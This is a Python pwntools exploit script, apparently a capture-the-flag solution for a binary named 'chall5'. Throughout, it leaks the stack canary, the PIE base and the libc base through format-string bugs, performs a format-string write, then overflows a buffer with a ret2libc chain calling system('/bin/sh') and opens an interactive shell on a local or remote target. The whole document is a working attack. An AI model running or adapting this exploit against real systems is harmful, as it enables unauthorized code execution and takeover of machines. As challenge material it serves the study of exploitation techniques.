#!/usr/bin/python
from pwn import *
import sys

# these will need to be altered depending on the libc version
# 
BASE  = 0x73c     # offset from leak to binary base (to overcome PIE)
LIBC  = 0x7058b   # offset from libc leak to libc base (to overcome ASLR)

SYS   = 0x03cd10  # offset from libc base to system()
BINSH = 0x17b8cf  # offset from libc base to /bin/sh
EXIT  = 0x02ff70  # offset from libc base to exit()

HOST  = ''
PORT  = 12345
LOCAL = True
if len(sys.argv) > 1:
	LOCAL = False
	HOST = sys.argv[1]

if len(sys.argv) > 2:
	PORT = sys.argv[2]

if LOCAL:
	io = process('../chall5')
else:
	io = remote(HOST, PORT)

# lovely banner
print io.recvuntil(':')[:-6]

# step 1: leak the buffer and canary
io.sendline('%p.%43$p')
leak = io.recvline().split(' ')[1].split('.')

canary = int(leak[1], 16)
strbuf = int(leak[0], 16)

log.info('canary: 0x%08x', canary)
log.info('buffer: 0x%08x', strbuf)

# step 2: leak pie and libc
io.recvuntil(': ')
io.sendline('%3$p.%2$p')
leak = io.recvline().split(' ')[0].split('.')

base =  int(leak[0], 16) - BASE
libc =  int(leak[1], 16) - LIBC

log.info('libc:   0x%08x', libc)
log.info('base:   0x%08x', base)

# step 3: overwrite the format string with %s to do bof
io.sendline('%29477c%7$n')
io.recvuntil('incorrect\n').strip()

# step 4: do a buffer overflow and win
rop  = 'XXXX'
rop += 'YYYY'           # ebx
rop += 'ZZZZ'           # ebp
rop += p32(libc+SYS)    # system()
rop += p32(libc+EXIT)   # exit()
rop += p32(libc+BINSH)  # /bin/sh

# step 4: perform bof
io.sendline(cyclic(128)+p32(canary)+rop)
io.recvline()

# step 5: enjoy the shell
io.sendline('id')
log.success(io.recvline().strip())

io.interactive()
